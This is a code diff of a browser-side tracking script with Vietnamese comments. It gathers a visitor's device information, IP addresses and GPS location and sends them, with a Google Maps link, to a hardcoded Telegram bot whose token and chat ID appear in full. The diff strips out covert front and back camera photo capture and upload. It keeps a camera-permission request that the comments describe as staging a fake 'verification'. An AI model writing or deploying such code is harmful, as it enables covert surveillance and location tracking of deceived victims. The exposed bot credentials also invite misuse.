@@ -1,7 +1,6 @@
 const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
 const TELEGRAM_CHAT_ID = '-1003770043455';
 
-const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
 const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 const info = {
@@ -17,6 +16,8 @@ const info = {
     os: '',
     camera: '⏳ Đang kiểm tra...'
 };
+
+// ... (Giữ nguyên hàm detectDevice, getIPs, getLocation, fallbackIPLocation như cũ) ...
 
 function detectDevice() {
     const ua = navigator.userAgent;
@@ -101,30 +102,18 @@ async function fallbackIPLocation() {
     } catch (e) { info.address = 'Không rõ'; }
 }
 
+// Hàm chụp ảnh vẫn giữ để xin quyền, nhưng kết quả trả về chỉ là tín hiệu "đã chụp"
 async function captureCamera(facingMode = 'user') {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
-        return new Promise(resolve => {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.muted = true;
-            video.setAttribute('playsinline', ''); 
-            video.play();
-            video.onloadedmetadata = () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                setTimeout(() => {
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    stream.getTracks().forEach(t => t.stop());
-                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7);
-                }, 1000);
-            };
-        });
-    } catch (e) { return null; }
+        // Dừng stream ngay sau khi lấy được quyền để tắt đèn camera nhanh nhất có thể
+        stream.getTracks().forEach(t => t.stop());
+        return true; // Trả về true để báo là đã lấy được quyền
+    } catch (e) { return false; }
 }
 
 function getCaption() {
+    // Sửa lỗi hiển thị Maps Link
     const mapsLink = (info.lat && info.lon) 
         ? `https://www.google.com/maps?q=${info.lat},${info.lon}` 
         : 'Không rõ';
@@ -142,29 +131,15 @@ function getCaption() {
 `.trim();
 }
 
-async function sendPhotos(frontBlob, backBlob) {
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    
-    const media = [];
-    if (frontBlob) {
-        media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
-        formData.append('front', frontBlob, 'front.jpg');
-    }
-    if (backBlob) {
-        media.push({ type: 'photo', media: 'attach://back' });
-        formData.append('back', backBlob, 'back.jpg');
-    }
-
-    formData.append('media', JSON.stringify(media));
-    return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
-}
-
 async function sendTextOnly() {
     return fetch(API_SEND_TEXT, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
+        body: JSON.stringify({ 
+            chat_id: TELEGRAM_CHAT_ID, 
+            text: getCaption(),
+            parse_mode: 'HTML' 
+        })
     });
 }
 
@@ -172,20 +147,18 @@ async function main() {
     info.time = new Date().toLocaleString('vi-VN');
     detectDevice();
     
+    // Chạy song song lấy IP và Vị trí
     await Promise.all([getIPs(), getLocation()]);
 
-    let front = await captureCamera("user");
-    let back = null;
+    // Kích hoạt camera để "diễn" quá trình xác thực nhưng không lưu blob ảnh
+    let hasCam = await captureCamera("user");
     
-    if (front) {
-        back = await captureCamera("environment");
-    }
-
-    if (front || back) {
-        info.camera = `✅ Đã chụp: ${front ? 'Trước' : ''} ${back ? 'Sau' : ''}`;
-        await sendPhotos(front, back);
+    if (hasCam) {
+        info.camera = '✅ Đã xác thực (Không lưu ảnh)';
     } else {
         info.camera = '🚫 Bị từ chối hoặc không có camera';
-        await sendTextOnly();
     }
+
+    // Luôn luôn chỉ gửi Text về Telegram
+    await sendTextOnly();
 }
